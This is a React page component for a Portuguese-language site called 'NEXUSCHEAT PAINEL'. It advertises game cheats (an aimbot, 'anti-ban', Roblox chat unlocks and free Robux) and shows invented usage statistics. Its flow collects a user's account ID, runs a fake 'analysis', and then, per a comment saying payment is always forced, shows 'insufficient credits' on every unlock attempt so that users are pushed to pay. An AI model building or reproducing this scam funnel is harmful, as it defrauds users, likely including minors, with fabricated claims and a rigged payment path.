import { useState, useCallback } from "react"
import { Header } from "@/components/Header"
import { GameCard } from "@/components/GameCard"
import { AnalysisModal } from "@/components/AnalysisModal"
import { AnalysisProgress } from "@/components/AnalysisProgress"
import { ResultsPanel } from "@/components/ResultsPanel"
import { ConfirmModal } from "@/components/ConfirmModal"
import { InsufficientCreditsModal } from "@/components/InsufficientCreditsModal"
import { PaymentModal } from "@/components/PaymentModal"
import { useCredits } from "@/hooks/useCredits"
import { Shield, Lock, Zap, Users } from "lucide-react"

const games = [
  { id: "roblox", name: "Roblox", description: " LIBERAÇAO DE RESTRIÇAO CHAT API ROBLOX + 336 ROBUX", status: "online" },
  { id: "pubg", name: "PUBG Mobile", description: "sincronização de AIM BOT - MIRA 79% SEM BAN", status: "stable" },
  { id: "freefire", name: "Free Fire", description: " SETUP 3 DEDOS V4 @NEXUSCHEATS", status: "online" },
  { id: "codmobile", name: "COD Mobile", description: "@ZENITICHETS PAINEL CODE MOBILE V2", status: "stable" },
  { id: "clashroyale", name: "Clash Royale", description: "CLASH MUD V2.21 ELIXIR TRAVADO @NEXUSCHEAT", status: "online" },
] as const

const stats = [
  { icon: Users, value: "847,293", label: "Usuários ativos" },
  { icon: Shield, value: "99.9%", label: "Taxa de sucesso" },
  { icon: Lock, value: "256-bit", label: "Criptografia" },
  { icon: Zap, value: "<30s", label: "Tempo médio" },
]

type ModalState =
  | "none"
  | "analysis-input"
  | "analysis-progress"
  | "results"
  | "confirm"
  | "insufficient"
  | "payment"

export default function Index() {
  const { credits } = useCredits()

  const [modalState, setModalState] = useState<ModalState>("none")
  const [selectedGame, setSelectedGame] = useState<{ id: string; name: string } | null>(null)
  const [accountId, setAccountId] = useState("")

  /* ===== FLUXO ===== */

  const handleGameSelect = (id: string, name: string) => {
    setSelectedGame({ id, name })
    setModalState("analysis-input")
  }

  const handleStartAnalysis = (id: string) => {
    setAccountId(id)
    setModalState("analysis-progress")
  }

  const handleAnalysisComplete = useCallback(() => {
    setModalState("results")
  }, [])

  const handleUnlock = () => {
    setModalState("confirm")
  }

  // Estratégia de conversão: sempre força pagamento
  const handleConfirmUnlock = () => {
    setModalState("insufficient")
  }

  const handleAddCredits = () => {
    setModalState("payment")
  }

  const handleCloseModal = () => {
    setModalState("none")
  }

  return (
    <div className="min-h-screen bg-background">
      <Header credits={credits} onAddCredits={handleAddCredits} />

      {/* ===== HERO ===== */}
      <section className="py-16 text-center">
        <h1 className="text-4xl font-bold mb-4">
          <span className="text-gradient-cyber">NEXUSCHEAT PAINEL</span><br />
          SISTEMA ANTI BAN 100% 
        </h1>
        <p className="text-muted-foreground max-w-2xl mx-auto">
          NOVO :  Liberação automática do chat no Roblox VIA ID🔐
        🆔⚡ Ativação inteligente vinculada ao seu perfil.
        Privacidade total em todo o processo de ativação ✅
        </p>
      </section>

      {/* ===== STATS ===== */}
      <section className="pb-12">
        <div className="container mx-auto px-4 grid grid-cols-2 md:grid-cols-4 gap-4">
          {stats.map((stat, i) => (
            <div key={i} className="card-cyber p-4 text-center">
              <stat.icon className="h-6 w-6 mx-auto mb-2 text-primary" />
              <p className="text-xl font-bold">{stat.value}</p>
              <p className="text-xs text-muted-foreground">{stat.label}</p>
            </div>
          ))}
        </div>
      </section>

      {/* ===== JOGOS / PRODUTOS ===== */}
      <section className="py-12">
        <div className="container mx-auto px-4 grid md:grid-cols-2 lg:grid-cols-3 gap-4">
          {games.map((game) => (
            <GameCard
              key={game.id}
              id={game.id}
              name={game.name}
              description={game.description}
              status={game.status}
              onSelect={handleGameSelect}
            />
          ))}
        </div>
      </section>

      {/* ===== MODAIS ===== */}
      <AnalysisModal
        isOpen={modalState === "analysis-input"}
        gameName={selectedGame?.name || ""}
        onClose={handleCloseModal}
        onStartAnalysis={handleStartAnalysis}
      />

      <AnalysisProgress
        isOpen={modalState === "analysis-progress"}
        gameName={selectedGame?.name || ""}
        accountId={accountId}
        onComplete={handleAnalysisComplete}
      />

      <ResultsPanel
        isOpen={modalState === "results"}
        gameName={selectedGame?.name || ""}
        accountId={accountId}
        onUnlock={handleUnlock}
        onClose={handleCloseModal}
      />

      <ConfirmModal
        isOpen={modalState === "confirm"}
        credits={10}
        onConfirm={handleConfirmUnlock}
        onCancel={() => setModalState("results")}
      />

      <InsufficientCreditsModal
        isOpen={modalState === "insufficient"}
        onAddCredits={handleAddCredits}
        onClose={handleCloseModal}
      />

      <PaymentModal
        isOpen={modalState === "payment"}
        accountId={accountId}
        onClose={handleCloseModal}
      />
    </div>
  )
}
